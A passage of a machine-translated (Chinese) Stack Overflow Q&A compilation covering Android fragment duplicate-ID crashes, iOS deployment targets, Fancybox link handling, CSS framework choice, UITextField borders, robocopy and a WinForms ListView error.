非常感谢任何和所有帮助。请让我知道是否还有其他可以添加的内容？

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2013-04-12T07:24:11.267

问题是 xml 上的片段被加载了两次，第二次将其添加到 FragmentManager 时会收到 IllegalArgumentException。我昨天遇到了同样的问题。

我的解决方案，我将其更改为动态重新创建片段，而不是在 xml 文件中定义它：

更改此 xml 文件部分：

```
<fragment
    android:id="@+id/fragment_content"
    android:layout_width="0dp"
    android:layout_weight="1"
    android:layout_height="match_parent"
    android:layout_marginTop="?android:attr/actionBarSize"
    class="com.example.blobtag2.ListFragmentClickable" ></fragment> 
```

为此：

```
<FrameLayout
    android:id="@+id/fragment_content"
    android:layout_width="0dp"
    android:layout_weight="1"
    android:layout_height="match_parent"
    android:layout_marginTop="?android:attr/actionBarSize" /> 
```

然后在 onCreate 中，你应该将 FrameLayout 替换为一个新片段：

```
Fragment fragment = new ListFragmentClickable();
FragmentManager     fm = getSupportFragmentManager();
FragmentTransaction ft = fm.beginTransaction();
ft.replace(R.id.fragment_content, fragment);
ft.commit(); 
```

然后你有同样的，但你不会得到一个重复的 ID 错误。

* * *

## 回答 #2

> 赞同：38
> 
> 时间：2013-12-19T15:31:10.517

**当在 XML 中定义片段**（静态）时会发生这种情况：如果父片段被销毁，FragmentManager 不会管理子片段。然后，当第二次扩展 XML 时，它会中断（“重复 id”错误）。

当父被破坏时，我绕过这个问题**手动删除 XML 片段**，在父片段中使用以下代码：

```
@Override
public void onDestroyView() {

    FragmentManager fm = getFragmentManager();

    Fragment xmlFragment = fm.findFragmentById(R.id.XML_FRAGMENT_ID);
    if (xmlFragment != null) {
        fm.beginTransaction().remove(xmlFragment).commit();
    }

    super.onDestroyView();
} 
```

**复制粘贴**的注意事项：*XML_FRAGMENT_ID*是 XML 中片段的 ID；）

 *** * *

此外，我更喜欢**包装 XML 片段的新类**。它简化了代码，因为您只需要从中扩展您的片段类。将此类添加到您的项目中：

```
package net.treboada.mytests.fragments;

import android.app.Activity;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.util.AttributeSet;

public class XmlFragment extends Fragment {

    @Override
    public void onInflate(Activity activity, AttributeSet attrs,
            Bundle savedInstanceState) {

        FragmentManager fm = getFragmentManager();
        if (fm != null) {
            fm.beginTransaction().remove(this).commit();
        }

        super.onInflate(activity, attrs, savedInstanceState);
    }
} 
```

然后，扩展您的 XML 片段类：

```
package net.treboada.mytests.fragments;

public class TestXmlFragment01 extends XmlFragment {

    // ...

} 
```

瞧！:)

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2013-07-02T09:40:42.243

让我们试试这个。我遇到了同样的问题，我使用这段代码解决了我的问题。

```
 View root;

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
    if (root!= null) {
        ViewGroup parent = (ViewGroup) root.getParent();
        if (parent != null)
            parent.removeView(root);
    }
    try {
        root= inflater.inflate(R.layout.map_layout, container, false);
    } catch (InflateException e) {
        /* map is already there, just return view as it is */
    }
    return root;
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-03-19T23:56:43.617

如果您在此处阅读其他答案，感觉它们似乎是正确的，请查看此处[https://stackoverflow.com/a/19815266/1139784](https://stackoverflow.com/a/19815266/1139784)，因为它引用了解释如何不支持此功能的文档（至少在我的情况下，这很难从这个问题中判断布局片段嵌套是否正在发生）

```
Note: You cannot inflate a layout into a fragment when that layout includes a <fragment>.
Nested fragments are only supported when added to a fragment dynamically. 
```

此处有更多数据[不使用支持库的 Android 4.0、4.1 (<4.2) 中嵌套片段的最佳实践](https://stackoverflow.com/questions/15608935/best-practice-for-nested-fragments-in-android-4-0-4-1-4-2-without-using-the)

编辑：另外，如果您正在考虑使用嵌套片段并且不需要生命周期管理，您可以创建一个自定义视图组（如扩展 LinearLayout）。[http://www.vogella.com/tutorials/AndroidCustomViews/article.html](http://www.vogella.com/tutorials/AndroidCustomViews/article.html)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2015-07-30T12:05:34.417

您可以从 XmlFragment 扩展您的片段（在 xml 中加载）。它处理父 FragmentManager 并删除自己。

```
public class XmlFragment extends BaseFragment {

    @Override
    public void onDestroyView() {
        Fragment parentFragment = getParentFragment();
        FragmentManager manager;
        if (parentFragment != null) {
            // If parent is another fragment, then this fragment is nested
            manager = parentFragment.getChildFragmentManager();
        } else {
            // This fragment is placed into activity
            manager = getActivity().getSupportFragmentManager();
        }
        manager.beginTransaction().remove(this).commitAllowingStateLoss();
        super.onDestroyView();
    }
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-03-08T12:13:51.813

我在两次调用片段时遇到了同样的问题，第二次崩溃了。解决方案是在 onDetach 方法中实现 remove 语句：

```
 @override
public void onDetach(){
super.onDetach();
FragmentManager fm = getFragmentManager()

Fragment xmlFragment = fm.findFragmentById(R.id.yourfragmentid);
if(xmlFragment != null){
    fm.beginTransaction().remove(xmlFragment).commit();
    }
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-03-22T03:59:15.873

这条线

```
03-21 22:32:03.297: E/AndroidRuntime(764): Caused by: java.lang.IllegalArgumentException: Binary XML file line #7: Duplicate id 0x7f070003, tag null, or parent id 0x0 with another fragment for com.example.blobtag2.ListFragmentClickable 
```

特别是最后的部分

```
Duplicate id 0x7f070003, tag null, or parent id 0x0 with another fragment for com.example.blobtag2.ListFragmentClickable 
```

告诉您，在您的活动生命周期中的某个时刻，您正在尝试为 ListFragmentClickable 创建一个视图，而该视图已经存在。您需要弄清楚这是如何发生的。**

# iphone - 如何将所需的最低 iOS 版本设置为 5.0.1

> ID：15562417
> 
> 赞同：0
> 
> 时间：2013-03-22T03:49:52.930
> 
> 标签：iphone, ios

我的应用需要支持 iOS 版本 >= 5.0.1。我不能支持 <= 5.0，因为我需要为下载的数据设置“不备份”标志！

如何将所需的最低 iOS 版本设置为 5.0.1？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T03:52:12.190

该标志是在 iOS 5.1 中引入的，因此您必须将部署目标更改为 5.1 才能做到这一点。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-22T05:05:16.767

用它：

*   在 Xcode 中双击 Target 的名称以显示 Target Info。
*   转到 Build/Summary 选项卡并搜索“iPhone OS Deployment Target”。
*   选择您想要使用的任何 SDK 作为您的最低要求。

一件事是它不会告诉你它是否不适用于某个版本。您必须手动将您的方法与每个版本中可用的方法进行比较。

您也可以通过更改 Base SDK 来帮助遏制这种情况：

*   同样的地方，搜索“Base SDK”。
*   将其更改为您可以/想要的最低 iPhone OS 设备 SDK。
    （在 Snow Leopard 上，这是 2.2.1；如果您使用 Xcode 安装 Leopard，它可以低至 2.0。）

# design-patterns - 为什么“只有一个回报”？

> ID：15562420
> 
> 赞同：-2
> 
> 时间：2013-03-22T03:50:38.543
> 
> 标签：design-patterns, coding-style

今天收到一位资深开发者的 code review 评论，他指出的一件事是每个函数应该只有一个 return 语句。我想知道这只是代码风格问题还是存在安全问题，即潜在的函数堆栈问题或未初始化的变量。谁能提供一个例子（我更喜欢 C\C++\C#）来展示多个 return 语句的缺点？非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:02:10.160

在汇编中，所有函数都必须在函数开头设置堆栈后恢复堆栈。这意味着函数没有逃逸，除非你愿意多次编写清理堆栈代码，这对于空间效率来说并不是太好。

这仅适用于实际具有参数或调用其他函数或存储局部变量的函数，平面系统程序集可以随时返回。

用一个入口和一个返回，尽可能少的循环和跳转，并且有意图地推理程序的正确性要容易得多。多个返回语句让很多人失望（尽管人们仍然设法适应）。

我不会将多次返回称为邪恶，有时它们是必要的，并且在很多时候是有意义的，例如阶乘程序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:03:31.603

谷歌搜索会出现关于这个主题的数小时阅读。简短的版本是许多旧语言只允许一个返回点。此外，在较旧的过程编码风格中，通常有数千行长的方法。即使这不是语言要求，许多人发现如果在每个方法的底部都有一个返回值，则代码更容易阅读。

快进到今天。如果您遵循面向对象的最佳实践，主要是单一职责原则，您的方法应该小于 50 行并且易于阅读。拥有多个返回点不是问题。事实上，它们有助于防止深度嵌套的代码。

我会在那里结束它；我刚刚注意到[这个 StackOverflow 问题](https://stackoverflow.com/questions/36707/should-a-function-have-only-one-return-statement)。读一读。

# php - 如何阻止花式框超链接在新选项卡或窗口中打开？

> ID：15562427
> 
> 赞同：0
> 
> 时间：2013-03-22T03:51:34.597
> 
> 标签：php, jquery, fancybox

我对 Fancybox 有一个严重的问题。我有一个带有图片库的网站。如果图像上有任何滥用数据，用户可以举报图像。

目前我正在使用 Fancybox 来显示报表。我正在使用 jQuery 验证输入字段并使用 AJAX 提交数据，并且脚本位于父页面上。

`<a href="linktothereportform?id=5" class="report fancybox.ajax" rel="nofollow" style="color:#CC0033;">report</a>`

这完美地工作。但是，如果用户在新选项卡或新窗口中打开链接，则会出现问题，因为验证脚本不在报告表单上。这些在父页面上。

那么有什么方法可以**停止右键单击或单击鼠标滚动**，或者我将如何克服这个问题？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T06:36:13.120

另一种选择是在单击选择器时捕获所有鼠标按钮（左、右和滚轮）`.report`并触发fancybox（如果有的话）：

```
$(document).ready(function () {
    $(".report").on('mousedown', function (e) {
        if (e.which == 1 || e.which == 3 || e.which == 2) {
            e.preventDefault();
            $(this).fancybox({
                // API options
            }).click();
        }
        return false;
    });
    $(document).on('contextmenu', function (e) {
        e.preventDefault();
    });
}); 
```

请参阅**[JSFIDDLE](http://jsfiddle.net/cz29F/)**并在缩略图上尝试任何鼠标按钮。

**注意**：`.on()`需要 jQuery 1.7+

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-22T03:56:40.843

您可以通过 div 或 input.button 元素上的函数调用来调用 fancybox

```
<input type="button" value="click here" class="fake-fancy" data-href="linktothereportform?id=5">

<span class="fake-fancy" data-href="linktothereportform?id=5">Report</span>

<script type="text/javascript">
  jQuery('.fake-fancy').click(function(){
    jQuery.fancybox.open({
      href: jQuery(this).attr('data-href'),
      type: 'ajax'
    });
  });
</script> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-22T03:57:26.020

您可以通过用按钮替换所有此类链接来取消右键单击和中间单击选项。

IE

```
$('a.report').replaceWith('<button onclick="window.location.href=\'linktothereportform?id=5\'">report</button>'); 
```

您可能需要对上述内容进行一些调整，并将按钮样式设置为看起来像链接等，但总体思路是获得“在同一窗口中打开”功能，同时取消所有“在新窗口中打开”可能性。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-22T04:56:37.167

**所有的功劳都应该归功于那些为我的问题提供正确有价值答案的人。**

我决定为将来寻求这个问题答案的人做一个很好的答案。

我基本上会将我的答案分为两部分。

至于我最初的问题，我需要一个带有超链接的解决方案。

**所以第一种方法是超链接**

> 正如@Jeemusu 的评论。

Fancybox 使用 AJAX 加载内容。有一个名为 的 HTTP 变量集， 如果它是 AJAX 请求`HTTP_X_REQUESTED_WITH`，它将被设置并设置为。`'xmlhttprequest'`

因此，即使有人在新选项卡中打开链接，我们也可以检查它是否是`AJAX`或`non-AJAX`并据此显示内容。所以不用担心右键单击。

```
<?php
if(isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
//this is an ajax request. do what you need to 
}
else {
    //this is non ajax. do what you need
}
?> 
```

**第二个选项是将超链接更改为按钮或任何 div。**

`'open-in-same-window'`一般的想法是在排除所有`'open-in-new-window'`可能性的同时获得功能。

> 正如@Scuzzy 和@techfoobar 的回答

```
<input type="button" value="click here" class="fake-fancy" data-href="linktothereportform?id=5">

<span class="fake-fancy" data-href="linktothereportform?id=5">Report</span>

<script type="text/javascript">
  jQuery('.fake-fancy').click(function(){
    jQuery.fancybox.open({
      href: jQuery(this).attr('data-href'),
      type: 'ajax'
    });
  });
</script> 
```

**或者**

```
jQuery('a.report').each(function(){jQuery(this).replaceWith('<button onclick="window.location.href=\'' + jQuery(this).attr('href') + '\'">report</button>');}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-22T05:03:24.093

您可以将其替换`link`为`button`不会让用户在新选项卡中打开它。你可以这样做：

```
<button onclick="window.location='linktothereportform?id=5';" class="report fancybox.ajax" style="color:#CC0033;">report</button> 
```

# twitter-bootstrap - 将 Zurb Foundation 4 / Twitter Bootstrap 3 用于非移动优先项目

> ID：15562436
> 
> 赞同：22
> 
> 时间：2013-03-22T03:52:27.567
> 
> 标签：twitter-bootstrap, zurb-foundation, twitter-bootstrap-3

有人用过 Foundation 4 或 Bootstrap 3 beta 吗？如您所知，两者都被重新编写以使其首先成为移动设备。

我对移动优先的方法感到非常兴奋，但在现实生活中，有时情况不允许我们做我们认为正确的事情。

所以我只想问，有没有人将 F4 或 BS3 用于非移动优先（甚至非响应式）项目？我还没有真正深入研究代码，并且文档非常缺乏。

我的意思是，在 F4/BS3 中是否有一些隐藏的警告，如果我将其中一个用于非移动优先/响应项目，不知何故它不会像两个框架都是移动优先框架那样顺利运行？或者您是否建议将 Foundation 3.5 或 Bootstrap 2.3 用于非移动优先项目？

谢谢，希望我说得足够清楚。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2013-03-26T22:52:24.100

我的公司最近才改用 F4 独占使用。我们完全不反对 Bootstrap，但以下是我们做出决定的原因：

*   更多语义类：这当然是一个见仁见智的问题，但对我们来说，这可以节省构建时间。

*   黄金标准：您可以将 F4 交给几乎任何具有 html 和 css 知识的人，您将看到几乎所有网站的相同站点的非常相似的标记。这意味着在需要时外包帮助变得更加容易，并确保质量设计。

*   用户界面：是的，如果你单独判断它，Bootstrap 会赢，但如果你从整体上看，它的基础用户界面非常接近。另外请记住，您可以使用 app.css 自定义任何内容

*   Zepto：我是粉丝。我能说什么。搜索引擎优化是我们世界的一部分，快速加载意味着什么，甚至将搜索引擎优化排除在外……快速加载=更少反弹。

*   搜索引擎优化：谷歌已经出来并推荐移动搜索引擎优化的响应式设计。

*   为什么不呢？：我不能使用框架重新创建哪些站点。它仍然是 CSS。它确实迫使我们重新思考我们如何编码，但这不就是我们喜欢编码的原因吗？找出简化设计的解决方案？

    对不起小说。只是我对它的看法，我知道它并不是 100% 的主题。实际上，F4 vs Bootstrap 3 真的是一个哞哞点。如果您响应迅速，那么您正在使自己有市场。如果你不是，那么你完全忽略了技术的发展方向，你应该退出游戏。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-08-12T04:26:46.413

我刚刚整理了 3,200 字，关于哪个框架更好。简单的答案是：Foundation 4，而且还没有那么接近。

全文：[http ://abetteruserexperience.com/2013/08/twitter-bootstrap-3-vs-foundation-4-which-one-should-you-use/](http://abetteruserexperience.com/2013/08/twitter-bootstrap-3-vs-foundation-4-which-one-should-you-use/)

这两个框架有很多共同点，但也存在一些差异。Foundation 4 相对于 Twitter Bootstrap 3 的主要优势是：

*   易于记住的类命名约定
*   默认响应的图像
*   将到达屏幕边缘的容器
*   块网格
*   自适应图像（交换）
*   演练（Joyride）
*   表单验证（遵守）
*   定价表
*   弹性视频
*   内联列表
*   无冲突模式才有效
*   如果遇到问题，可以访问 ZURB

简单地说：Bootstrap 感觉像是某人的爱好，Foundation 4 感觉像是某人的工作。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-03-22T08:15:10.207

我的以下观点是基于我在项目中广泛使用 Foundation 以及对 Bootstrap 的有限使用。当我在您的问题中看到“非移动优先”一词时，我想到的直接框架是 Bootstrap。我在这两个框架中发现的主要区别是

Foundation 是一个很好的实现响应式网格系统的框架。它可以很好地控制您希望如何在手机和桌面上显示您的页面。但与此同时，与 Bootstrap 相比，我发现 Foundation 中的 UI 元素不够流畅。

Bootstrap 有一些很棒的 UI 元素，很棒的外观，并且确实提供了响应网格，但没有 Foundation 强大。但它有一些很棒的资源和额外的插件，非常有用

因此，根据我的观点，如果您的项目不是 Mobile First，那么请使用 Bootstrap，否则 Foundation 是最佳选择 :)

PS - 新的 Bootstrap 3 是移动优先的。所以“当我在你的问题中看到‘非移动优先’这个词时，我想到的直接框架是 Bootstrap”在我的回答中不再有效。但是扣款还是一样的。如果你想对网格进行高水平的控制，你应该选择 Foundation。对于 UI/Plugins，Bootstrap 是不错的选择 :)

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2013-04-30T15:55:01.447

F4 和 Bootstrap 都是功能强大的响应式框架，可以很好地完成这项工作。Foundation 比 Bootstrap 有更多的响应钩子，这在响应式项目中特别有用。F4 不支持 IE8（按设计）的事实将阻止一些人现在使用它。据我所知，Bootstrap 3 使用 F4 等移动优先方法继续支持 IE8。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-10-09T21:31:14.497

您始终可以将模板（在任一框架中）设置为使用固定宽度。稍后，如果您需要对其他设备（如平板电脑）的支持，可以轻松添加一些 CSS 来处理这些尺寸和方向。

# ios - UITextField 只有上下边框

> ID：15562438
> 
> 赞同：26
> 
> 时间：2013-03-22T03:52:38.473
> 
> 标签：ios, objective-c, cocoa-touch, uitextfield

我目前有一个常规边界。我**只想有一个顶部和底部边框**。

我该如何做到这一点？

使用`UITextField`'s`layer`属性，我有以下代码：

```
 self.layer.borderColor = [[UIColor colorWithRed:160/255.0f green:160/255.0f blue:160/255.0f alpha:1.0f] CGColor];
    self.layer.borderWidth = 4.0f; 
```

**我通过让我的 UITextField extra long**让它工作起来，这样用户就看不到左右边框，但我只是想知道是否有更好的、不那么骇人听闻的方式来做到这一点？

我已经**检查了文档**，并且更改 a`UITextField`没有`borderStyle`此选项。

从，

iOS 初学者

* * *

## 回答 #1

> 赞同：77
> 
> 时间：2014-10-28T13:09:58.837

我发现一种效果很好的方法是使用图层。这是一个片段：

```
CALayer *bottomBorder = [CALayer layer];
bottomBorder.frame = CGRectMake(0.0f, self.frame.size.height - 1, self.frame.size.width, 1.0f);
bottomBorder.backgroundColor = [UIColor blackColor].CGColor;
[myTextField.layer addSublayer:bottomBorder]; 
```

希望这可以帮助某人。

* * *

## 回答 #2

> 赞同：42
> 
> 时间：2014-11-24T20:21:20.643

@user3075378 在 Swift 中的伟大而简单的例子

```
var bottomBorder = CALayer()
bottomBorder.frame = CGRectMake(0.0, textField.frame.size.height - 1, textField.frame.size.width, 1.0);
bottomBorder.backgroundColor = UIColor.blackColor().CGColor
textField.layer.addSublayer(bottomBorder) 
```

* * *

## 回答 #3

> 赞同：22
> 
> 时间：2015-05-12T12:59:45.300

@Sebyddd 为什么停在那里？(;

**编辑：**在自动布局为视图设置正确的框架之前绘制线条存在问题，我通过修复编辑了我的答案：它基本上涉及`drawLines()`调用`layoutSubviews()`：

```
class FramedTextField: UITextField {

    @IBInspectable var linesWidth: CGFloat = 1.0 { didSet{ drawLines() } }

    @IBInspectable var linesColor: UIColor = UIColor.blackColor() { didSet{ drawLines() } }

    @IBInspectable var leftLine: Bool = false { didSet{ drawLines() } }
    @IBInspectable var rightLine: Bool = false { didSet{ drawLines() } }
    @IBInspectable var bottomLine: Bool = false { didSet{ drawLines() } }
    @IBInspectable var topLine: Bool = false { didSet{ drawLines() } }

    func drawLines() {

        if bottomLine {
            add(CGRectMake(0.0, frame.size.height - linesWidth, frame.size.width, linesWidth))
        }

        if topLine {
            add(CGRectMake(0.0, 0.0, frame.size.width, linesWidth))
        }

        if rightLine {
            add(CGRectMake(frame.size.width - linesWidth, 0.0, linesWidth, frame.size.height))
        }

        if leftLine {
            add(CGRectMake(0.0, 0.0, linesWidth, frame.size.height))
        }

    }

    typealias Line = CGRect
    private func add(line: Line) {
        let border = CALayer()
        border.frame = line
        border.backgroundColor = linesColor.CGColor
        layer.addSublayer(border)
    }

    override func layoutSubviews() {
        super.layoutSubviews()
        drawLines()
    }

} 
```

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2013-03-22T03:58:05.067

您可以创建一个带有顶部和底部边框的图像，并将其设置为 UITextField 的背景：

```
yourTextField.backgroundColor = [UIColor colorWithPatternImage:[UIImage imageNamed:@"yourBorderedImageName"]]; 
```

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2013-06-19T00:15:47.140

您还可以将视图添加到顶部和底部以用作边框。

```
// Top border
UIView *topBorder = [[UIView alloc]
    initWithFrame:CGRectMake(0,
                             0,
                             textfield.frame.size.width,
                             4.0f)];
topBorder.backgroundColor = [UIColor colorWithRed:160/255.0f
                                            green:160/255.0f
                                             blue:160/255.0f
                                            alpha:1.0f];
[textfield addSubview:topBorder];

// Bottom border
UIView *bottomBorder = [[UIView alloc]
    initWithFrame:CGRectMake(0,
                             textfield.frame.origin.y +
                                 textfield.frame.size.height - 4.0f,
                             textfield.frame.size.width,
                             4.0f)];
bottomBorder.backgroundColor = [UIColor colorWithRed:160/255.0f
                                               green:160/255.0f
                                                blue:160/255.0f
                                               alpha:1.0f];
[textfield addSubview:bottomBorder]; 
```

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2014-02-10T18:50:41.103

您可以使用图层将线条/形状添加到任何 UIView 子类。此代码在文本字段的顶部和底部绘制两行。您可以将它添加到控件的子类中，或者直接在父视图/视图控制器中调用它。

```
CGRect layerFrame = CGRectMake(0, 0, _usernameField.frame.size.width, _usernameField.frame.size.height);
CGMutablePathRef path = CGPathCreateMutable();
CGPathMoveToPoint(path, NULL, 0, 0);
CGPathAddLineToPoint(path, NULL, layerFrame.size.width, 0); // top line
CGPathMoveToPoint(path, NULL, 0, layerFrame.size.height);
CGPathAddLineToPoint(path, NULL, layerFrame.size.width, layerFrame.size.height); // bottom line
CAShapeLayer * line = [CAShapeLayer layer];
line.path = path;
line.lineWidth = 2;
line.frame = layerFrame;
line.strokeColor = [UIColor blackColor].CGColor;
[_usernameField.layer addSublayer:line]; 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2016-12-19T17:53:26.847

Swift 3：使用 AutoLayout 进行清理（我在这里使用 PureLayout，但您也可以使用常见的 NSLayoutConstraint：

```
func makeUnderline(for textField: UITextField) {
    let borderLine = UIView()
    borderLine.backgroundColor = UIColor.black
    borderLine.autoSetDimension(.height, toSize: 1)
    textField.addSubview(borderLine)
    borderLine.autoPinEdgesToSuperviewEdges(with: UIEdgeInsets.zero, excludingEdge: .top)
} 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2013-03-22T04:06:28.937

我建议您在文本字段的左侧放置一个视图，在文本字段的右侧放置一个视图以覆盖左/右边框。

```
UIView *v1 = [[UIView all] initWithFrame:CGRectMake(textfield.frame.origin.x - 5, textfield.frame.origin.y, 10, textifield.frame.size.height)];
UIView *v2 = [[UIView all] initWithFrame:CGRectMake(textfield.frame.origin.x + textfield.frame.size.with - 5, textfield.frame.origin.y, 10, textifield.frame.size.height)]; 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2016-04-06T01:14:53.743

希望这会有所帮助，将其放在文本字段覆盖类中

```
UIView *view = [[UIView alloc] init];
        view.translatesAutoresizingMaskIntoConstraints = NO;
        view.layer.borderWidth = 1;
        view.backgroundColor = [UIColor blackColor];
        [self addSubview:view];

        [self addConstraint:[NSLayoutConstraint constraintWithItem:view attribute:NSLayoutAttributeBottom relatedBy:NSLayoutRelationEqual toItem:self attribute:NSLayoutAttributeBottom multiplier:1.0 constant:0.0]];
        [self addConstraint:[NSLayoutConstraint constraintWithItem:view attribute:NSLayoutAttributeWidth relatedBy:NSLayoutRelationEqual toItem:self attribute:NSLayoutAttributeWidth multiplier:1.0 constant:0.0]];
        [self addConstraint:[NSLayoutConstraint constraintWithItem:view attribute:NSLayoutAttributeHeight relatedBy:NSLayoutRelationEqual toItem:nil attribute:NSLayoutAttributeHeight multiplier:1.0 constant:1.0]];
        [self addConstraint:[NSLayoutConstraint constraintWithItem:view attribute:NSLayoutAttributeCenterX relatedBy:NSLayoutRelationEqual toItem:self attribute:NSLayoutAttributeCenterX multiplier:1.0 constant:1.0]]; 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2016-06-23T20:14:46.230

感谢用户 3075378。我的回答是基于他的。添加左右小线。

```
- (void)styleSearchTextField {
    CALayer *bottomBorder = [CALayer layer], *leftBorder = [CALayer layer], *rightBorder = [CALayer layer];

    CGFloat thickness = 1.0f;
    CGFloat side_height = 6.0f;

    bottomBorder.frame = CGRectMake(0.0f, searchTextField.frame.size.height - 1, searchTextField.frame.size.width, thickness);

    leftBorder.frame = CGRectMake(0.0f, searchTextField.frame.size.height - side_height, thickness, searchTextField.frame.size.height - 1);

    rightBorder.frame = CGRectMake(searchTextField.frame.size.width - 1, searchTextField.frame.size.height - side_height, thickness, searchTextField.frame.size.height - 1);

    bottomBorder.backgroundColor = [self.stylingDetails themeGrayColor].CGColor;
    leftBorder.backgroundColor = [self.stylingDetails themeGrayColor].CGColor;
    rightBorder.backgroundColor = [self.stylingDetails themeGrayColor].CGColor;

    [searchTextField.layer addSublayer:bottomBorder];
    [searchTextField.layer addSublayer:leftBorder];
    [searchTextField.layer addSublayer:rightBorder];
} 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2020-08-08T03:46:08.983

为 Swift 5 更新

```
var bottomBorder = CALayer()
bottomBorder.frame = CGRect(x: xVal, y: yVal, width: w, height: h)
bottomBorder.backgroundColor = UIColor.black.cgColor
searchBar.layer.addSublayer(bottomBorder) 
```

# windows - 如何复制整个目录结构？

> ID：15562443
> 
> 赞同：3
> 
> 时间：2013-03-22T03:54:45.810
> 
> 标签：windows, powershell

我正在将 10,000 个文件从一个目录复制到另一个目录。

两个目录结构具有相同的文件；但是，尺寸可能不同。

如何强制覆盖具有不同大小的文件并且不要复制相同大小的文件？

到目前为止，我有这个：

```
$source = 'D:\Test1'
$destination = 'D:\test2'
$exclude = @('*.db','test2.log')
$sourcelist = Get-ChildItem $source -exclude $exclude
foreach ($file in $sourcelist){
  $result = test-path -path "$destination\*" -include $file
  if ($result -like "False"){
    #uncomment the next line to see the value being passed to the $file parameter
    #Write-Host $file
    Copy-Item "$file" -Destination "$destination"
  }
} 
```

我认为这将复制目标上不存在的文件。但是，我也想复制确实存在但大小不同的文件。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-22T08:29:58.757

使用[`robocopy`](http://technet.microsoft.com/en-us/library/cc733145%28v=ws.10%29.aspx)而不是尝试在 PowerShell 中重新发明它。

```
robocopy D:\Test1 D:\Test2 /s 
```

如果您还想包含只有属性不同的文件（“调整文件”），`/it`也可以添加。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-22T06:19:59.437

我认为检查 $sourcelist 文件 LastWrite 时间戳，然后将其与目标文件时间戳进行比较。

# c# - WinForm Control ListView“算术运算导致溢出。”

> ID：15562444
> 
> 赞同：0
> 
> 时间：2013-03-22T03:54:59.027
> 
> 标签：c#, winforms, listview

XP下运行良好，但是换到Win7后问题就出现了。我检查了我所有的应用程序代码，但一无所获。好的，如果我只是将一个 ListView 放在一个新窗口中，然后运行，同样的问题。我的英语不好，我厌倦了，请帮助我。非常感谢。 ![这是错误信息](../Images/8e1ff31d38af83589ef13d2e54cab435.png)

```
 public frmChooseBoxes(int flag, string complex)
    {
        otbList = Ocean_Turnover_BoxManager.GetOcean_Turnover_BoxesBySql("select * from Ocean_Turnover_Box where Status in (2,3) order by boxnum");
        //初始化选择框
        if (complex != "")
        {
            myNums = complex;
            string[] numbers = complex.Split(',');
            nList = new List<string>();
            foreach (string number in numbers)
            {
                nList.Add(number);
            }
        }
        else
        {
            nList = null;
        }
        InitializeComponent();
    }

private void InitializeComponent()
{
    System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmChooseBoxes));
    this.btnExit = new System.Windows.Forms.Button();
    this.btnRemoveAll = new System.Windows.Forms.Button();
    this.btnRemoveSingle = new System.Windows.Forms.Button();
    this.btnAddAll = new System.Windows.Forms.Button();
    this.btnAddSingle = new System.Windows.Forms.Button();
    this.btnConfirm = new System.Windows.Forms.Button();
    this.label1 = new System.Windows.Forms.Label();
    this.label2 = new System.Windows.Forms.Label();
    this.lvSelectBoxes = new System.Windows.Forms.ListView();
    this.lvBox = new System.Windows.Forms.ListView();
    this.label3 = new System.Windows.Forms.Label();
    this.groupBox1 = new System.Windows.Forms.GroupBox();
    this.txtBoxNoChk = new System.Windows.Forms.TextBox();
    this.lblBoxNoS = new System.Windows.Forms.Label();
    this.groupBox1.SuspendLayout();
    this.SuspendLayout();
    // 
    // btnExit
    // 
    this.btnExit.Location = new System.Drawing.Point(375, 302);
    this.btnExit.Name = "btnExit";
    this.btnExit.Size = new System.Drawing.Size(75, 23);
    this.btnExit.TabIndex = 15;
    this.btnExit.Text = "退出";
    this.btnExit.UseVisualStyleBackColor = true;
    this.btnExit.Click += new System.EventHandler(this.btnExit_Click);
    // 
    // btnRemoveAll
    // 
    this.btnRemoveAll.Location = new System.Drawing.Point(216, 212);
    this.btnRemoveAll.Name = "btnRemoveAll";
    this.btnRemoveAll.Size = new System.Drawing.Size(30, 23);
    this.btnRemoveAll.TabIndex = 14;
    this.btnRemoveAll.Text = "<<";
    this.btnRemoveAll.UseVisualStyleBackColor = true;
    this.btnRemoveAll.Click += new System.EventHandler(this.btnRemoveAll_Click);
    // 
    // btnRemoveSingle
    // 
    this.btnRemoveSingle.Location = new System.Drawing.Point(216, 183);
    this.btnRemoveSingle.Name = "btnRemoveSingle";
    this.btnRemoveSingle.Size = new System.Drawing.Size(30, 23);
    this.btnRemoveSingle.TabIndex = 13;
    this.btnRemoveSingle.Text = "<";
    this.btnRemoveSingle.UseVisualStyleBackColor = true;
